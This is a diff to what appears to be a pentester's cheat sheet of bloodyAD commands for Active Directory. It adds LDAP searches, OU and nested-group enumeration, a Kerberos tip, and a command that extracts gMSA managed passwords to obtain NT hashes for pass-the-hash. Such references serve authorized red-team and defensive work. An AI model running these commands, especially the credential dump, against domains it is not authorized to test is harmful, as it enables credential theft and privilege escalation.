@@ -3,6 +3,8 @@
 
 <!-- tags: ad,bloodyad,acl,privesc,kerberos,delegation -->
 
+> Cross-forest or non-DC LDAP targets: bloodyAD's `--host` takes the LDAP endpoint, but Kerberos operations need a separate `--kdcHost` pointing at a DC in the target's forest. Missed `--kdcHost` → cryptic auth failures.
+
 ## get writable objects
 List every object the current user can write to — maps immediate ACL-based privesc paths.
 
@@ -297,3 +299,47 @@ bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} remove
 ```
 
 <!-- meta: risk=med | phase=post | tags=cleanup,spn -->
+
+---
+
+## search custom ldap filter attr
+Free-form LDAP search with attribute projection. Backbone primitive — combine any RFC2254 filter with any attribute list.
+
+```bash
+bloodyAD -u {{USER:str}} -p {{PASS:str}} -d {{DOMAIN:domain}} --host {{DC_IP:ip}} get search --filter '{{LDAP_FILTER:str:(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=local))}}' --attr {{ATTRS:str:sAMAccountName,memberOf}}
+```
+
+<!-- meta: risk=low | phase=enum | tags=bloodyad,ldap,search,filter -->
+
+---
+
+## dump gmsa managed password
+gMSA password blob extraction — equivalent to gMSADumper.py but in-tool. The password derives the NT hash directly usable with -H.
+
+```bash
+bloodyAD -u {{USER:str}} -p {{PASS:str}} -d {{DOMAIN:domain}} --host {{DC_IP:ip}} get object '{{GMSA:str:svc_gmsa$}}' --attr msDS-ManagedPassword
+```
+
+<!-- meta: risk=low | phase=post | tags=bloodyad,gmsa,managed-password,dump -->
+
+---
+
+## enum object children ou tree walk
+Walk the AD tree — list direct children of an OU/container. Recon primitive that saves reaching for ldapsearch.
+
+```bash
+bloodyAD -u {{USER:str}} -p {{PASS:str}} -d {{DOMAIN:domain}} --host {{DC_IP:ip}} get children '{{OU_DN:str:OU=IT,DC=example,DC=local}}'
+```
+
+<!-- meta: risk=low | phase=enum | tags=bloodyad,children,ou,tree -->
+
+---
+
+## enum user membership nested
+Full group membership walk for a user, including nested groups — resolves the transitive chain that a raw memberOf attribute misses.
+
+```bash
+bloodyAD -u {{USER:str}} -p {{PASS:str}} -d {{DOMAIN:domain}} --host {{DC_IP:ip}} get membership '{{TARGET_USER:str}}' --nested
+```
+
+<!-- meta: risk=low | phase=enum | tags=bloodyad,membership,nested,groups -->
